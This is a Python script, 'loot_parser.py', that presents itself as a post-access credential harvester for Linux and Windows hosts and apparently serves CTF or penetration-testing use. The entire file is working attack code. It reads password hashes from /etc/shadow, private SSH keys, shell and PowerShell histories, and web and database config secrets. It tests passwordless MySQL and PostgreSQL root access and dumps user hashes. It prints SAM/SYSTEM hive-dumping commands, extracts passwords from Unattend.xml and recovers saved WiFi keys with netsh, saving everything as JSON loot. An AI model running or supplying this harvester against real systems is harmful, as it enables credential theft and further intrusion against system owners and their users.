```python
#!/usr/bin/env python3
"""
loot_parser.py - Post-access credential harvester
Usage: python3 loot_parser.py --output loot.json
"""

import argparse
import os
import re
import json
import platform
import subprocess
from datetime import datetime
from pathlib import Path

R = '\033[91m'
G = '\033[92m'
Y = '\033[93m'
C = '\033[96m'
B = '\033[1m'
X = '\033[0m'

def info(s): print(f"{C}[*]{X} {s}")
def good(s): print(f"{G}[+]{X} {s}")
def warn(s): print(f"{Y}[!]{X} {s}")
def bad(s): print(f"{R}[-]{X} {s}")
def head(s): print(f"\n{B}{C}{'-'*60}{X}\n{B}  {s}{X}\n{'-'*60}")

LOOT = {
    "hashes": [],
    "plaintext": [],
    "ssh_keys": [],
    "config_creds": [],
    "history": [],
    "tokens": [],
    "interesting": [],
}

def run(cmd, timeout=8):
    try:
        r = subprocess.run(cmd, shell=True, capture_output=True, text=True, timeout=timeout)
        return r.stdout.strip()
    except Exception:
        return ""

def read_file(path, max_bytes=8192):
    try:
        with open(path, "r", errors="ignore") as f:
            return f.read(max_bytes)
    except Exception:
        return None

CRED_PATTERNS = [
    (r"password\s*[=:]\s*['\"]?([^\s'\"#\n]{4,})", "password"),
    (r"passwd\s*[=:]\s*['\"]?([^\s'\"#\n]{4,})", "passwd"),
    (r"secret\s*[=:]\s*['\"]?([^\s'\"#\n]{4,})", "secret"),
    (r"api_?key\s*[=:]\s*['\"]?([^\s'\"#\n]{8,})", "api_key"),
    (r"token\s*[=:]\s*['\"]?([^\s'\"#\n]{8,})", "token"),
    (r"DB_PASS\s*[=:]\s*['\"]?([^\s'\"#\n]{3,})", "db_pass"),
    (r"MYSQL_PASSWORD\s*[=:]\s*['\"]?([^\s'\"#\n]{3,})", "mysql_pass"),
]

def harvest_shadow():
    head("Password Hashes")
    for f in ["/etc/shadow", "/etc/shadow-", "/etc/master.passwd"]:
        content = read_file(f)
        if content:
            warn(f"Readable: {f}")
            for line in content.splitlines():
                parts = line.split(":")
                if len(parts) >= 2 and parts[1] not in ["*", "!", "x", ""]:
                    good(f"  Hash: {line[:80]}")
                    LOOT["hashes"].append({"file": f, "line": line[:80]})
            print(content[:1000])

def harvest_ssh_keys():
    head("SSH Keys")
    search_dirs = ["/root", "/home", "/etc/ssh"]
    private_key_files = ["id_rsa", "id_ecdsa", "id_ed25519", "id_dsa"]

    for base in search_dirs:
        if not os.path.exists(base):
            continue
        for root, dirs, files in os.walk(base):
            for fname in files:
                if fname in private_key_files:
                    path = os.path.join(root, fname)
                    content = read_file(path)
                    if content and "PRIVATE KEY" in content:
                        warn(f"Private key: {path}")
                        LOOT["ssh_keys"].append({"path": path, "content": content[:500]})
                        print(content[:200])
                if fname == "authorized_keys":
                    path = os.path.join(root, fname)
                    content = read_file(path)
                    if content:
                        info(f"Authorized keys: {path}")
                        print(content[:300])

def harvest_histories():
    head("Shell Histories")
    history_files = [
        "/root/.bash_history", "/root/.zsh_history",
        "/root/.sh_history", "/root/.python_history",
    ]

    if Path("/home").exists():
        for home in Path("/home").iterdir():
            for hf in [".bash_history", ".zsh_history", ".sh_history"]:
                history_files.append(str(home / hf))

    sensitive_keywords = ["pass", "ssh", "curl", "wget", "mysql", "psql", "su ", "sudo", "scp", "secret", "key", "token"]

    for path in history_files:
        if not os.path.exists(path):
            continue
        content = read_file(path)
        if content and len(content) > 5:
            warn(f"History: {path}")
            interesting = [l for l in content.splitlines() if any(kw in l.lower() for kw in sensitive_keywords)]
            if interesting:
                for line in interesting[:20]:
                    good(f"  {line.strip()}")
                    LOOT["history"].append({"file": path, "line": line.strip()})
            else:
                for line in content.splitlines()[-10:]:
                    out_line = line.strip()
                    if out_line:
                        print(f"  {out_line}")

def harvest_config_files():
    head("Config File Credentials")
    import glob
    config_paths = [
        "/var/www/html/config.php", "/var/www/html/wp-config.php",
        "/var/www/html/configuration.php",
        "/var/www/html/config/database.php",
        "/var/www/html/application/config/database.php",
        "/var/www/html/.env",
        "/etc/mysql/my.cnf", "/etc/mysql/mysql.conf.d/mysqld.cnf",
        "/etc/postgresql/*/main/pg_hba.conf",
        "/etc/redis/redis.conf",
        "/opt/tomcat/conf/tomcat-users.xml",
        "/etc/tomcat*/tomcat-users.xml",
        "/root/.my.cnf", "/home/*/.my.cnf",
    ]

    for pattern in config_paths:
        for path in glob.glob(pattern):
            content = read_file(path)
            if not content:
                continue
            for pat, label in CRED_PATTERNS:
                for m in re.finditer(pat, content, re.IGNORECASE):
                    val = m.group(1)
                    if val and len(val) > 2:
                        warn(f"  {path} -> {label}: {val}")
                        LOOT["config_creds"].append({"file": path, "type": label, "value": val})

def harvest_database_creds():
    head("Database Credential Check")
    mysql_out = run("mysql -u root --password='' -e 'show databases;' 2>/dev/null")
    if mysql_out and "information_schema" in mysql_out:
        warn("MySQL accessible as root with no password!")
        LOOT["plaintext"].append({"service": "mysql", "user": "root", "pass": ""})
        out = run("mysql -u root --password='' -e 'SELECT user,authentication_string FROM mysql.user;' 2>/dev/null")
        print(out[:500])

    pg_out = run("psql -U postgres -c '\\l' 2>/dev/null")
    if pg_out and "postgres" in pg_out.lower():
        warn("PostgreSQL accessible as postgres!")
        LOOT["plaintext"].append({"service": "postgresql", "user": "postgres", "pass": ""})

def harvest_interesting_files():
    head("Interesting Files")
    import glob
    interesting_names = [
        "id_rsa", "*.pem", "*.key", "*.p12", "*.pfx",
        "credentials", "creds", "passwords", "pass.txt",
        "*.kdbx", "*.db", "*.sqlite", "*.sqlite3",
        "flag.txt", "user.txt", "root.txt", "proof.txt",
    ]
    search_roots = ["/home", "/root", "/opt", "/var/www", "/tmp", "/srv"]

    for root_dir in search_roots:
        if not os.path.exists(root_dir):
            continue
        for pattern in interesting_names:
            for path in glob.glob(f"{root_dir}/**/{pattern}", recursive=True):
                size = os.path.getsize(path) if os.path.exists(path) else 0
                warn(f"  {path} ({size} bytes)")
                LOOT["interesting"].append(path)
                if path.endswith((".txt", "root.txt", "user.txt", "proof.txt", "flag.txt")):
                    content = read_file(path)
                    if content:
                        good(f"  Contents: {content.strip()[:100]}")

def win_harvest():
    head("Windows Loot Harvest")
    info("Attempting SAM/SYSTEM registry save (requires SYSTEM)")
    print("  reg save HKLM\\SAM C:\\Temp\\sam.hive")
    print("  reg save HKLM\\SYSTEM C:\\Temp\\system.hive")
    print("  Then transfer and: secretsdump.py -sam sam.hive -system system.hive LOCAL")

    head("Windows Credential Files")
    cred_paths = [
        os.path.expandvars(r"%USERPROFILE%\AppData\Roaming\Microsoft\Credentials"),
        os.path.expandvars(r"%APPDATA%\Microsoft\Protect"),
        r"C:\Windows\repair\SAM",
        r"C:\Windows\repair\SYSTEM",
        r"C:\Windows\System32\config\RegBack\SAM",
    ]
    for path in cred_paths:
        if os.path.exists(path):
            warn(f"Exists: {path}")
            LOOT["interesting"].append(path)

    unattended = [r"C:\Windows\Panther\Unattend.xml",
                  r"C:\Windows\Panther\Unattended.xml",
                  r"C:\Windows\sysprep\sysprep.xml",
                  r"C:\unattend.xml"]
    for path in unattended:
        content = read_file(path)
        if content:
            warn(f"Unattended file: {path}")
            for m in re.finditer(r"<Password>(.*?)</Password>", content, re.DOTALL):
                good(f"  Password: {m.group(1)[:80]}")
            LOOT["config_creds"].append({"file": path, "content": content[:500]})

    ps_hist = os.path.expandvars(r"%APPDATA%\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt")
    content = read_file(ps_hist)
    if content:
        warn(f"PowerShell history: {ps_hist}")
        for line in content.splitlines()[-30:]:
            print(f"  {line}")
            if any(kw in line.lower() for kw in ["pass", "cred", "secret", "invoke", "encode"]):
                LOOT["history"].append({"file": ps_hist, "line": line})

    wifi = run("netsh wlan show profile 2>nul")
    if wifi:
        for profile in re.findall(r"All User Profile\s+:\s+(.+)", wifi):
            pw = run(f'netsh wlan show profile name="{profile.strip()}" key=clear 2>nul')
            m = re.search(r"Key Content\s+:\s+(.+)", pw)
            if m:
                warn(f"WiFi cred — {profile.strip()}: {m.group(1).strip()}")
                LOOT["plaintext"].append({"service": "wifi", "ssid": profile.strip(), "pass": m.group(1).strip()})

def print_summary():
    head("LOOT SUMMARY")
    total = sum(len(v) for v in LOOT.values())
    good(f"Total items collected: {total}")
    for category, items in LOOT.items():
        if items:
            warn(f"  {category}: {len(items)} item(s)")
            for item in items[:3]:
                if isinstance(item, dict):
                    print(f"    {item}")
                else:
                    print(f"    {item}")

def main():
    ap = argparse.ArgumentParser(description="loot_parser.py — post-access credential harvester")
    ap.add_argument("--linux", action="store_true")
    ap.add_argument("--windows", action="store_true")
    ap.add_argument("--output", default=None, help="Save JSON loot to file")
    args = ap.parse_args()

    print(f"\n{B}{C}loot_parser.py — {datetime.now().strftime('%Y-%m-%d %H:%M')}{X}\n")

    is_windows = platform.system().lower() == "windows"

    if args.windows or is_windows:
        win_harvest()
    else:
        harvest_shadow()
        harvest_ssh_keys()
        harvest_histories()
        harvest_config_files()
        harvest_database_creds()
        harvest_interesting_files()

    print_summary()

    if args.output:
        with open(args.output, "w") as f:
            json.dump({"timestamp": datetime.now().isoformat(), "loot": LOOT}, f, indent=2)
        good(f"Loot saved to: {args.output}")

if __name__ == "__main__":
    main()
```